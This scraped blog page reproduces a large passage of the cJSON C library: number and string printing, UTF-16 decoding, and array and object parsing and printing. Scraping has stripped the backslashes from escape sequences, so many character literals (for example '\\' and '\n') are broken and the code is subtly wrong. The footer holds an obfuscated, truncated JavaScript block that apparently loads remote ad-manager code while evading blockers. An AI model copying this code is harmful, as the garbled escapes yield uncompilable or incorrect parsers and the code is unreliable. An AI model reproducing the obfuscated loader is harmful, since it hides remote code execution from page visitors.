	double d=item-&gt;valuedouble;
	if (d==0)
	{
		if (p)	str=ensure(p,2);
		else	str=(char*)cJSON_malloc(2);	/* special case for 0. */
		if (str) strcpy(str,"0");
	}
	else if (fabs(((double)item-&gt;valueint)-d)&lt;=DBL_EPSILON &amp;&amp; d&lt;=INT_MAX &amp;&amp; d&gt;=INT_MIN)
	{
		if (p)	str=ensure(p,21);
		else	str=(char*)cJSON_malloc(21);	/* 2^64+1 can be represented in 21 chars. */
		if (str)	sprintf(str,"%d",item-&gt;valueint);
	}
	else
	{
		if (p)	str=ensure(p,64);
		else	str=(char*)cJSON_malloc(64);	/* This is a nice tradeoff. */
		if (str)
		{
			if (fpclassify(d) != FP_ZERO &amp;&amp; !isnormal(d))				sprintf(str,"null");
			else if (fabs(floor(d)-d)&lt;=DBL_EPSILON &amp;&amp; fabs(d)&lt;1.0e60)	sprintf(str,"%.0f",d);
			else if (fabs(d)&lt;1.0e-6 || fabs(d)&gt;1.0e9)					sprintf(str,"%e",d);
			else														sprintf(str,"%f",d);
		}
	}
	return str;
}

static unsigned parse_hex4(const char *str)
{
	unsigned h=0;
	if (*str&gt;='0' &amp;&amp; *str&lt;='9') h+=(*str)-'0'; else if (*str&gt;='A' &amp;&amp; *str&lt;='F') h+=10+(*str)-'A'; else if (*str&gt;='a' &amp;&amp; *str&lt;='f') h+=10+(*str)-'a'; else return 0;
	h=h&lt;&lt;4;str++;
	if (*str&gt;='0' &amp;&amp; *str&lt;='9') h+=(*str)-'0'; else if (*str&gt;='A' &amp;&amp; *str&lt;='F') h+=10+(*str)-'A'; else if (*str&gt;='a' &amp;&amp; *str&lt;='f') h+=10+(*str)-'a'; else return 0;
	h=h&lt;&lt;4;str++;
	if (*str&gt;='0' &amp;&amp; *str&lt;='9') h+=(*str)-'0'; else if (*str&gt;='A' &amp;&amp; *str&lt;='F') h+=10+(*str)-'A'; else if (*str&gt;='a' &amp;&amp; *str&lt;='f') h+=10+(*str)-'a'; else return 0;
	h=h&lt;&lt;4;str++;
	if (*str&gt;='0' &amp;&amp; *str&lt;='9') h+=(*str)-'0'; else if (*str&gt;='A' &amp;&amp; *str&lt;='F') h+=10+(*str)-'A'; else if (*str&gt;='a' &amp;&amp; *str&lt;='f') h+=10+(*str)-'a'; else return 0;
	return h;
}

/* Parse the input text into an unescaped cstring, and populate item. */
static const unsigned char firstByteMark[7] = { 0x00, 0x00, 0xC0, 0xE0, 0xF0, 0xF8, 0xFC };
static const char *parse_string(cJSON *item,const char *str)
{
	const char *ptr=str+1;char *ptr2;char *out;int len=0;unsigned uc,uc2;
	if (*str!='"') {ep=str;return 0;}	/* not a string! */
	
	while (*ptr!='"' &amp;&amp; *ptr &amp;&amp; ++len) if (*ptr++ == '\') ptr++;	/* Skip escaped quotes. */
	
	out=(char*)cJSON_malloc(len+1);	/* This is how long we need for the string, roughly. */
	if (!out) return 0;
	
	ptr=str+1;ptr2=out;
	while (*ptr!='"' &amp;&amp; *ptr)
	{
		if (*ptr!='\') *ptr2++=*ptr++;
		else
		{
			ptr++;
			switch (*ptr)
			{
				case 'b': *ptr2++='b';	break;
				case 'f': *ptr2++='f';	break;
				case 'n': *ptr2++='n';	break;
				case 'r': *ptr2++='r';	break;
				case 't': *ptr2++='t';	break;
				case 'u':	 /* transcode utf16 to utf8. */
					uc=parse_hex4(ptr+1);ptr+=4;	/* get the unicode char. */

					if ((uc&gt;=0xDC00 &amp;&amp; uc&lt;=0xDFFF) || uc==0)	break;	/* check for invalid.	*/

					if (uc&gt;=0xD800 &amp;&amp; uc&lt;=0xDBFF)	/* UTF16 surrogate pairs.	*/
					{
						if (ptr[1]!='\' || ptr[2]!='u')	break;	/* missing second-half of surrogate.	*/
						uc2=parse_hex4(ptr+3);ptr+=6;
						if (uc2&lt;0xDC00 || uc2&gt;0xDFFF)		break;	/* invalid second-half of surrogate.	*/
						uc=0x10000 + (((uc&amp;0x3FF)&lt;&lt;10) | (uc2&amp;0x3FF));
					}

					len=4;if (uc&lt;0x80) len=1;else if (uc&lt;0x800) len=2;else if (uc&lt;0x10000) len=3; ptr2+=len;
					
					switch (len) {
						case 4: *--ptr2 =((uc | 0x80) &amp; 0xBF); uc &gt;&gt;= 6;
						case 3: *--ptr2 =((uc | 0x80) &amp; 0xBF); uc &gt;&gt;= 6;
						case 2: *--ptr2 =((uc | 0x80) &amp; 0xBF); uc &gt;&gt;= 6;
						case 1: *--ptr2 =(uc | firstByteMark[len]);
					}
					ptr2+=len;
					break;
				default:  *ptr2++=*ptr; break;
			}
			ptr++;
		}
	}
	*ptr2=0;
	if (*ptr=='"') ptr++;
	item-&gt;valuestring=out;
	item-&gt;type=cJSON_String;
	return ptr;
}

/* Render the cstring provided to an escaped version that can be printed. */
static char *print_string_ptr(const char *str,printbuffer *p)
{
	const char *ptr;char *ptr2,*out;int len=0,flag=0;unsigned char token;
	
	for (ptr=str;*ptr;ptr++) flag|=((*ptr&gt;0 &amp;&amp; *ptr&lt;32)||(*ptr=='"')||(*ptr=='\'))?1:0;
	if (!flag)
	{
		len=ptr-str;
		if (p) out=ensure(p,len+3);
		else		out=(char*)cJSON_malloc(len+3);
		if (!out) return 0;
		ptr2=out;*ptr2++='"';
		strcpy(ptr2,str);
		ptr2[len]='"';
		ptr2[len+1]=0;
		return out;
	}
	
	if (!str)
	{
		if (p)	out=ensure(p,3);
		else	out=(char*)cJSON_malloc(3);
		if (!out) return 0;
		strcpy(out,"""");
		return out;
	}
	ptr=str;while ((token=*ptr) &amp;&amp; ++len) {if (strchr(""\bfnrt",token)) len++; else if (token&lt;32) len+=5;ptr++;}
	
	if (p)	out=ensure(p,len+3);
	else	out=(char*)cJSON_malloc(len+3);
	if (!out) return 0;

	ptr2=out;ptr=str;
	*ptr2++='"';
	while (*ptr)
	{
		if ((unsigned char)*ptr&gt;31 &amp;&amp; *ptr!='"' &amp;&amp; *ptr!='\') *ptr2++=*ptr++;
		else
		{
			*ptr2++='\';
			switch (token=*ptr++)
			{
				case '\':	*ptr2++='\';	break;
				case '"':	*ptr2++='"';	break;
				case 'b':	*ptr2++='b';	break;
				case 'f':	*ptr2++='f';	break;
				case 'n':	*ptr2++='n';	break;
				case 'r':	*ptr2++='r';	break;
				case 't':	*ptr2++='t';	break;
				default: sprintf(ptr2,"u%04x",token);ptr2+=5;	break;	/* escape and print */
			}
		}
	}
	*ptr2++='"';*ptr2++=0;
	return out;
}
/* Invote print_string_ptr (which is useful) on an item. */
static char *print_string(cJSON *item,printbuffer *p)	{return print_string_ptr(item-&gt;valuestring,p);}

/* Predeclare these prototypes. */
static const char *parse_value(cJSON *item,const char *value);
static char *print_value(cJSON *item,int depth,int fmt,printbuffer *p);
static const char *parse_array(cJSON *item,const char *value);
static char *print_array(cJSON *item,int depth,int fmt,printbuffer *p);
static const char *parse_object(cJSON *item,const char *value);
static char *print_object(cJSON *item,int depth,int fmt,printbuffer *p);

/* Utility to jump whitespace and cr/lf */
static const char *skip(const char *in) {while (in &amp;&amp; *in &amp;&amp; (unsigned char)*in&lt;=32) in++; return in;}

/* Parse an object - create a new root, and populate. */
cJSON *cJSON_ParseWithOpts(const char *value,const char **return_parse_end,int require_null_terminated)
{
	const char *end=0;
	cJSON *c=cJSON_New_Item();
	ep=0;
	if (!c) return 0;       /* memory fail */

	end=parse_value(c,skip(value));
	if (!end)	{cJSON_Delete(c);return 0;}	/* parse failure. ep is set. */

	/* if we require null-terminated JSON without appended garbage, skip and then check for a null terminator */
	if (require_null_terminated) {end=skip(end);if (*end) {cJSON_Delete(c);ep=end;return 0;}}
	if (return_parse_end) *return_parse_end=end;
	return c;
}
/* Default options for cJSON_Parse */
cJSON *cJSON_Parse(const char *value) {return cJSON_ParseWithOpts(value,0,0);}

/* Render a cJSON item/entity/structure to text. */
char *cJSON_Print(cJSON *item)				{return print_value(item,0,1,0);}
char *cJSON_PrintUnformatted(cJSON *item)	{return print_value(item,0,0,0);}

char *cJSON_PrintBuffered(cJSON *item,int prebuffer,int fmt)
{
	printbuffer p;
	p.buffer=(char*)cJSON_malloc(prebuffer);
	p.length=prebuffer;
	p.offset=0;
	return print_value(item,0,fmt,&amp;p);
	return p.buffer;
}


/* Parser core - when encountering text, process appropriately. */
static const char *parse_value(cJSON *item,const char *value)
{
	if (!value)						return 0;	/* Fail on null. */
	if (!strncmp(value,"null",4))	{ item-&gt;type=cJSON_NULL;  return value+4; }
	if (!strncmp(value,"false",5))	{ item-&gt;type=cJSON_False; return value+5; }
	if (!strncmp(value,"true",4))	{ item-&gt;type=cJSON_True; item-&gt;valueint=1;	return value+4; }
	if (*value=='"')				{ return parse_string(item,value); }
	if (*value=='-' || (*value&gt;='0' &amp;&amp; *value&lt;='9'))	{ return parse_number(item,value); }
	if (*value=='[')				{ return parse_array(item,value); }
	if (*value=='{')				{ return parse_object(item,value); }

	ep=value;return 0;	/* failure. */
}

/* Render a value to text. */
static char *print_value(cJSON *item,int depth,int fmt,printbuffer *p)
{
	char *out=0;
	if (!item) return 0;
	if (p)
	{
		switch ((item-&gt;type)&amp;255)
		{
			case cJSON_NULL:	{out=ensure(p,5);	if (out) strcpy(out,"null");	break;}
			case cJSON_False:	{out=ensure(p,6);	if (out) strcpy(out,"false");	break;}
			case cJSON_True:	{out=ensure(p,5);	if (out) strcpy(out,"true");	break;}
			case cJSON_Number:	out=print_number(item,p);break;
			case cJSON_String:	out=print_string(item,p);break;
			case cJSON_Array:	out=print_array(item,depth,fmt,p);break;
			case cJSON_Object:	out=print_object(item,depth,fmt,p);break;
		}
	}
	else
	{
		switch ((item-&gt;type)&amp;255)
		{
			case cJSON_NULL:	out=cJSON_strdup("null");	break;
			case cJSON_False:	out=cJSON_strdup("false");break;
			case cJSON_True:	out=cJSON_strdup("true"); break;
			case cJSON_Number:	out=print_number(item,0);break;
			case cJSON_String:	out=print_string(item,0);break;
			case cJSON_Array:	out=print_array(item,depth,fmt,0);break;
			case cJSON_Object:	out=print_object(item,depth,fmt,0);break;
		}
	}
	return out;
}

/* Build an array from input text. */
static const char *parse_array(cJSON *item,const char *value)
{
	cJSON *child;
	if (*value!='[')	{ep=value;return 0;}	/* not an array! */

	item-&gt;type=cJSON_Array;
	value=skip(value+1);
	if (*value==']') return value+1;	/* empty array. */

	item-&gt;child=child=cJSON_New_Item();
	if (!item-&gt;child) return 0;		 /* memory fail */
	value=skip(parse_value(child,skip(value)));	/* skip any spacing, get the value. */
	if (!value) return 0;

	while (*value==',')
	{
		cJSON *new_item;
		if (!(new_item=cJSON_New_Item())) return 0; 	/* memory fail */
		child-&gt;next=new_item;new_item-&gt;prev=child;child=new_item;
		value=skip(parse_value(child,skip(value+1)));
		if (!value) return 0;	/* memory fail */
	}

	if (*value==']') return value+1;	/* end of array */
	ep=value;return 0;	/* malformed. */
}

/* Render an array to text */
static char *print_array(cJSON *item,int depth,int fmt,printbuffer *p)
{
	char **entries;
	char *out=0,*ptr,*ret;int len=5;
	cJSON *child=item-&gt;child;
	int numentries=0,i=0,fail=0;
	size_t tmplen=0;
	
	/* How many entries in the array? */
	while (child) numentries++,child=child-&gt;next;
	/* Explicitly handle numentries==0 */
	if (!numentries)
	{
		if (p)	out=ensure(p,3);
		else	out=(char*)cJSON_malloc(3);
		if (out) strcpy(out,"[]");
		return out;
	}

	if (p)
	{
		/* Compose the output array. */
		i=p-&gt;offset;
		ptr=ensure(p,1);if (!ptr) return 0;	*ptr='[';	p-&gt;offset++;
		child=item-&gt;child;
		while (child &amp;&amp; !fail)
		{
			print_value(child,depth+1,fmt,p);
			p-&gt;offset=update(p);
			if (child-&gt;next) {len=fmt?2:1;ptr=ensure(p,len+1);if (!ptr) return 0;*ptr++=',';if(fmt)*ptr++=' ';*ptr=0;p-&gt;offset+=len;}
			child=child-&gt;next;
		}
		ptr=ensure(p,2);if (!ptr) return 0;	*ptr++=']';*ptr=0;
		out=(p-&gt;buffer)+i;
	}
	else
	{
		/* Allocate an array to hold the values for each */
		entries=(char**)cJSON_malloc(numentries*sizeof(char*));
		if (!entries) return 0;
		memset(entries,0,numentries*sizeof(char*));
		/* Retrieve all the results: */
		child=item-&gt;child;
		while (child &amp;&amp; !fail)
		{
			ret=print_value(child,depth+1,fmt,0);
			entries[i++]=ret;
			if (ret) len+=strlen(ret)+2+(fmt?1:0); else fail=1;
			child=child-&gt;next;
		}
		
		/* If we didn't fail, try to malloc the output string */
		if (!fail)	out=(char*)cJSON_malloc(len);
		/* If that fails, we fail. */
		if (!out) fail=1;

		/* Handle failure. */
		if (fail)
		{
			for (i=0;i&lt;numentries;i++) if (entries[i]) cJSON_free(entries[i]);
			cJSON_free(entries);
			return 0;
		}
		
		/* Compose the output array. */
		*out='[';
		ptr=out+1;*ptr=0;
		for (i=0;i&lt;numentries;i++)
		{
			tmplen=strlen(entries[i]);memcpy(ptr,entries[i],tmplen);ptr+=tmplen;
			if (i!=numentries-1) {*ptr++=',';if(fmt)*ptr++=' ';*ptr=0;}
			cJSON_free(entries[i]);
		}
		cJSON_free(entries);
		*ptr++=']';*ptr++=0;
	}
	return out;	
}

/* Build an object from the text. */
static const char *parse_object(cJSON *item,const char *value)
{
	cJSON *child;
	if (*value!='{')	{ep=value;return 0;}	/* not an object! */
	
	item-&gt;type=cJSON_Object;
	value=skip(value+1);
	if (*value=='}') return value+1;	/* empty array. */
	
	item-&gt;child=child=cJSON_New_Item();
	if (!item-&gt;child) return 0;
	value=skip(parse_string(child,skip(value)));
	if (!value) return 0;
	child-&gt;string=child-&gt;valuestring;child-&gt;valuestring=0;
	if (*value!=':') {ep=value;return 0;}	/* fail! */
	value=skip(parse_value(child,skip(value+1)));	/* skip any spacing, get the value. */
	if (!value) return 0;
	
	while (*value==',')
	{
		cJSON *new_item;
		if (!(new_item=cJSON_New_Item()))	return 0; /* memory fail */
		child-&gt;next=new_item;new_item-&gt;prev=child;child=new_item;
		value=skip(parse_string(child,skip(value+1)));
		if (!value) return 0;
		child-&gt;string=child-&gt;valuestring;child-&gt;valuestring=0;
		if (*value!=':') {ep=value;return 0;}	/* fail! */
		value=skip(parse_value(child,skip(value+1)));	/* skip any spacing, get the value. */
		if (!value) return 0;
	}
	
	if (*value=='}') return value+1;	/* end of array */
	ep=value;return 0;	/* malformed. */
}

/* Render an object to text. */
static char *print_object(cJSON *item,int depth,int fmt,printbuffer *p)
{
	char **entries=0,**names=0;
	char *out=0,*ptr,*ret,*str;int len=7,i=0,j;
	cJSON *child=item-&gt;child;
	int numentries=0,fail=0;
	size_t tmplen=0;
	/* Count the number of entries. */
	while (child) numentries++,child=child-&gt;next;
	/* Explicitly handle empty object case */
	if (!numentries)
	{
		if (p) out=ensure(p,fmt?depth+4:3);
		else	out=(char*)cJSON_malloc(fmt?depth+4:3);
		if (!out)	return 0;
		ptr=out;*ptr++='{';
		if (fmt) {*ptr++='n';for (i=0;i&lt;depth-1;i++) *ptr++='t';}
		*ptr++='}';*ptr++=0;
		return out;
	}
	if (p)
	{
		/* Compose the output: */
		i=p-&gt;offset;
		len=fmt?2:1;	ptr=ensure(p,len+1);	if (!ptr) return 0;
		*ptr++='{';	if (fmt) *ptr++='n';	*ptr=0;	p-&gt;offset+=len;
		child=item-&gt;child;depth++;
		while (child)
		{
			if (fmt)
			{
				ptr=ensure(p,depth);	if (!ptr) return 0;
				for (j=0;j&lt;depth;j++) *ptr++='t';
				p-&gt;offset+=depth;
			}
			print_string_ptr(child-&gt;string,p);
			p-&gt;offset=update(p);
			
			len=fmt?2:1;
			ptr=ensure(p,len);	if (!ptr) return 0;
			*ptr++=':';if (fmt) *ptr++='t';
			p-&gt;offset+=len;
			
			print_value(child,depth,fmt,p);
			p-&gt;offset=update(p);

			len=(fmt?1:0)+(child-&gt;next?1:0);
			ptr=ensure(p,len+1); if (!ptr) return 0;
			if (child-&gt;next) *ptr++=',';
			if (fmt) *ptr++='n';*ptr=0;
			p-&gt;offset+=len;
			child=child-&gt;next;
		}
		ptr=ensure(p,fmt?(depth+1):2);	 if (!ptr) return 0;
		if (fmt)	for (i=0;i&lt;depth-1;i++) *ptr++='t';
		*ptr++='}';*ptr=0;
		out=(p-&gt;buffer)+i;
	}
	else
	{
		/* Allocate space for the names and the objects */
		entries=(char**)cJSON_malloc(numentries*sizeof(char*));
		if (!entries) return 0;
		names=(char**)cJSON_malloc(numentries*sizeof(char*));
		if (!names) {cJSON_free(entries);return 0;}
		memset(entries,0,sizeof(char*)*numentries);
		memset(names,0,sizeof(char*)*numentries);

		/* Collect all the results into our arrays: */
		child=item-&gt;child;depth++;if (fmt) len+=depth;
		while (child &amp;&amp; !fail)
		{
			names[i]=str=print_string_ptr(child-&gt;string,0);
			entries[i++]=ret=print_value(child,depth,fmt,0);
			if (str &amp;&amp; ret) len+=strlen(ret)+strlen(str)+2+(fmt?2+depth:0); else fail=1;
			child=child-&gt;next;
		}
		
		/* Try to allocate the output string */
		if (!fail)	out=(char*)cJSON_malloc(len);
		if (!out) fail=1;

		/* Handle failure */
		if (fail)
		{
			for (i=0;i&lt;numentries;i++) {if (names[i]) cJSON_free(names[i]);if (entries[i]) cJSON_free(entries[i]);}
			cJSON_free(names);cJSON_free(entries);
			return 0;
		}
		
		/* Compose the output: */
		*out='{';ptr=out+1;if (fmt)*ptr++='n';*ptr=0;
		for (i=0;i&lt;numentries;i++)
		{
			if (fmt) for (j=0;j&lt;depth;j++) *ptr++='t';
			tmplen=strlen(names[i]);memcpy(ptr,names[i],tmplen);ptr+=tmplen;
			*ptr++=':';if (fmt) *ptr++='t';
			strcpy(ptr,entries[i]);ptr+=strlen(entries[i]);
			if (i!=numentries-1) *ptr++=',';
			if (fmt) *ptr++='n';*ptr=0;
			cJSON_free(names[i]);cJSON_free(entries[i]);
		}
		
		cJSON_free(names);cJSON_free(entries);
		if (fmt) for (i=0;i&lt;depth-1;i++) *ptr++='t';
		*ptr++='}';*ptr++=0;
	}
	return out;	
}

/* Get Array size/item / object item. */
int    cJSON_GetArraySize(cJSON *array)							{cJSON *c=array-&gt;child;int i=0;while(c)i++,c=c-&gt;next;return i;}
cJSON *cJSON_GetArrayItem(cJSON *array,int item)				{cJSON *c=array-&gt;child;  while (c &amp;&amp; item&gt;0) item--,c=c-&gt;next; return c;}
cJSON *cJSON_GetObjectItem(cJSON *object,const char *string)	{cJSON *c=object-&gt;child; while (c &amp;&amp; cJSON_strcasecmp(c-&gt;string,string)) c=c-&gt;next; return c;}
int cJSON_HasObjectItem(cJSON *object,const char *string)	{
	cJSON *c=object-&gt;child;
	while (c )
	{
		if(cJSON_strcasecmp(c-&gt;string,string)==0){
			return 1;
		}
	c=c-&gt;next;
	}
	return 0;
}

/* Utility for array list handling. */
static void suffix_object(cJSON *prev,cJSON *item) {prev-&gt;next=item;item-&gt;prev=prev;}
/* Utility for handling references. */
static cJSON *create_reference(cJSON *item) {cJSON *ref=cJSON_New_Item();if (!ref) return 0;memcpy(ref,item,sizeof(cJSON));ref-&gt;string=0;ref-&gt;type|=cJSON_IsReference;ref-&gt;next=ref-&gt;prev=0;return ref;}

/* Add item to array/object. */
void   cJSON_AddItemToArray(cJSON *array, cJSON *item)						{cJSON *c=array-&gt;child;if (!item) return; if (!c) {array-&gt;child=item;} else {while (c &amp;&amp; c-&gt;next) c=c-&gt;next; suffix_object(c,item);}}
void   cJSON_AddItemToObject(cJSON *object,const char *string,cJSON *item)	{if (!item) return; if (item-&gt;string) cJSON_free(item-&gt;string);item-&gt;string=cJSON_strdup(string);cJSON_AddItemToArray(object,item);}
void   cJSON_AddItemToObjectCS(cJSON *object,const char *string,cJSON *item)	{if (!item) return; if (!(item-&gt;type&amp;cJSON_StringIsConst) &amp;&amp; item-&gt;string) cJSON_free(item-&gt;string);item-&gt;string=(char*)string;item-&gt;type|=cJSON_StringIsConst;cJSON_AddItemToArray(object,item);}
void	cJSON_AddItemReferenceToArray(cJSON *array, cJSON *item)						{cJSON_AddItemToArray(array,create_reference(item));}
void	cJSON_AddItemReferenceToObject(cJSON *object,const char *string,cJSON *item)	{cJSON_AddItemToObject(object,string,create_reference(item));}

cJSON *cJSON_DetachItemFromArray(cJSON *array,int which)			{cJSON *c=array-&gt;child;while (c &amp;&amp; which&gt;0) c=c-&gt;next,which--;if (!c) return 0;
	if (c-&gt;prev) c-&gt;prev-&gt;next=c-&gt;next;if (c-&gt;next) c-&gt;next-&gt;prev=c-&gt;prev;if (c==array-&gt;child) array-&gt;child=c-&gt;next;c-&gt;prev=c-&gt;next=0;return c;}
void   cJSON_DeleteItemFromArray(cJSON *array,int which)			{cJSON_Delete(cJSON_DetachItemFromArray(array,which));}
cJSON *cJSON_DetachItemFromObject(cJSON *object,const char *string) {int i=0;cJSON *c=object-&gt;child;while (c &amp;&amp; cJSON_strcasecmp(c-&gt;string,string)) i++,c=c-&gt;next;if (c) return cJSON_DetachItemFromArray(object,i);return 0;}
void   cJSON_DeleteItemFromObject(cJSON *object,const char *string) {cJSON_Delete(cJSON_DetachItemFromObject(object,string));}

/* Replace array/object items with new ones. */
void   cJSON_InsertItemInArray(cJSON *array,int which,cJSON *newitem)		{cJSON *c=array-&gt;child;while (c &amp;&amp; which&gt;0) c=c-&gt;next,which--;if (!c) {cJSON_AddItemToArray(array,newitem);return;}
	newitem-&gt;next=c;newitem-&gt;prev=c-&gt;prev;c-&gt;prev=newitem;if (c==array-&gt;child) array-&gt;child=newitem; else newitem-&gt;prev-&gt;next=newitem;}
void   cJSON_ReplaceItemInArray(cJSON *array,int which,cJSON *newitem)		{cJSON *c=array-&gt;child;while (c &amp;&amp; which&gt;0) c=c-&gt;next,which--;if (!c) return;
	newitem-&gt;next=c-&gt;next;newitem-&gt;prev=c-&gt;prev;if (newitem-&gt;next) newitem-&gt;next-&gt;prev=newitem;
	if (c==array-&gt;child) array-&gt;child=newitem; else newitem-&gt;prev-&gt;next=newitem;c-&gt;next=c-&gt;prev=0;cJSON_Delete(c);}
void   cJSON_ReplaceItemInObject(cJSON *object,const char *string,cJSON *newitem){int i=0;cJSON *c=object-&gt;child;while(c &amp;&amp; cJSON_strcasecmp(c-&gt;string,string))i++,c=c-&gt;next;if(c){newitem-&gt;string=cJSON_strdup(string);cJSON_ReplaceItemInArray(object,i,newitem);}}

/* Create basic types: */
cJSON *cJSON_CreateNull(void)					{cJSON *item=cJSON_New_Item();if(item)item-&gt;type=cJSON_NULL;return item;}
cJSON *cJSON_CreateTrue(void)					{cJSON *item=cJSON_New_Item();if(item)item-&gt;type=cJSON_True;return item;}
cJSON *cJSON_CreateFalse(void)					{cJSON *item=cJSON_New_Item();if(item)item-&gt;type=cJSON_False;return item;}
cJSON *cJSON_CreateBool(int b)					{cJSON *item=cJSON_New_Item();if(item)item-&gt;type=b?cJSON_True:cJSON_False;return item;}
cJSON *cJSON_CreateNumber(double num)			{cJSON *item=cJSON_New_Item();if(item){item-&gt;type=cJSON_Number;item-&gt;valuedouble=num;item-&gt;valueint=(int)num;}return item;}
cJSON *cJSON_CreateString(const char *string)	{cJSON *item=cJSON_New_Item();if(item){item-&gt;type=cJSON_String;item-&gt;valuestring=cJSON_strdup(string);}return item;}
cJSON *cJSON_CreateArray(void)					{cJSON *item=cJSON_New_Item();if(item)item-&gt;type=cJSON_Array;return item;}
cJSON *cJSON_CreateObject(void)					{cJSON *item=cJSON_New_Item();if(item)item-&gt;type=cJSON_Object;return item;}

/* Create Arrays: */
cJSON *cJSON_CreateIntArray(const int *numbers,int count)		{int i;cJSON *n=0,*p=0,*a=cJSON_CreateArray();for(i=0;a &amp;&amp; i&lt;count;i++){n=cJSON_CreateNumber(numbers[i]);if(!i)a-&gt;child=n;else suffix_object(p,n);p=n;}return a;}
cJSON *cJSON_CreateFloatArray(const float *numbers,int count)	{int i;cJSON *n=0,*p=0,*a=cJSON_CreateArray();for(i=0;a &amp;&amp; i&lt;count;i++){n=cJSON_CreateNumber(numbers[i]);if(!i)a-&gt;child=n;else suffix_object(p,n);p=n;}return a;}
cJSON *cJSON_CreateDoubleArray(const double *numbers,int count)	{int i;cJSON *n=0,*p=0,*a=cJSON_CreateArray();for(i=0;a &amp;&amp; i&lt;count;i++){n=cJSON_CreateNumber(numbers[i]);if(!i)a-&gt;child=n;else suffix_object(p,n);p=n;}return a;}
cJSON *cJSON_CreateStringArray(const char **strings,int count)	{int i;cJSON *n=0,*p=0,*a=cJSON_CreateArray();for(i=0;a &amp;&amp; i&lt;count;i++){n=cJSON_CreateString(strings[i]);if(!i)a-&gt;child=n;else suffix_object(p,n);p=n;}return a;}

/* Duplication */
cJSON *cJSON_Duplicate(cJSON *item,int recurse)
{
	cJSON *newitem,*cptr,*nptr=0,*newchild;
	/* Bail on bad ptr */
	if (!item) return 0;
	/* Create new item */
	newitem=cJSON_New_Item();
	if (!newitem) return 0;
	/* Copy over all vars */
	newitem-&gt;type=item-&gt;type&amp;(~cJSON_IsReference),newitem-&gt;valueint=item-&gt;valueint,newitem-&gt;valuedouble=item-&gt;valuedouble;
	if (item-&gt;valuestring)	{newitem-&gt;valuestring=cJSON_strdup(item-&gt;valuestring);	if (!newitem-&gt;valuestring)	{cJSON_Delete(newitem);return 0;}}
	if (item-&gt;string)		{newitem-&gt;string=cJSON_strdup(item-&gt;string);			if (!newitem-&gt;string)		{cJSON_Delete(newitem);return 0;}}
	/* If non-recursive, then we're done! */
	if (!recurse) return newitem;
	/* Walk the -&gt;next chain for the child. */
	cptr=item-&gt;child;
	while (cptr)
	{
		newchild=cJSON_Duplicate(cptr,1);		/* Duplicate (with recurse) each item in the -&gt;next chain */
		if (!newchild) {cJSON_Delete(newitem);return 0;}
		if (nptr)	{nptr-&gt;next=newchild,newchild-&gt;prev=nptr;nptr=newchild;}	/* If newitem-&gt;child already set, then crosswire -&gt;prev and -&gt;next and move on */
		else		{newitem-&gt;child=newchild;nptr=newchild;}					/* Set newitem-&gt;child and move to it */
		cptr=cptr-&gt;next;
	}
	return newitem;
}

void cJSON_Minify(char *json)
{
	char *into=json;
	while (*json)
	{
		if (*json==' ') json++;
		else if (*json=='t') json++;	/* Whitespace characters. */
		else if (*json=='r') json++;
		else if (*json=='n') json++;
		else if (*json=='/' &amp;&amp; json[1]=='/')  while (*json &amp;&amp; *json!='n') json++;	/* double-slash comments, to end of line. */
		else if (*json=='/' &amp;&amp; json[1]=='*') {while (*json &amp;&amp; !(*json=='*' &amp;&amp; json[1]=='/')) json++;json+=2;}	/* multiline comments. */
		else if (*json=='"'){*into++=*json++;while (*json &amp;&amp; *json!='"'){if (*json=='\') *into++=*json++;*into++=*json++;}*into++=*json++;} /* string literals, which are " sensitive. */
		else *into++=*json++;			/* All other characters. */
	}
	*into=0;	/* and null-terminate. */
}
</code></pre> 
<p></p>
                </div>

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var 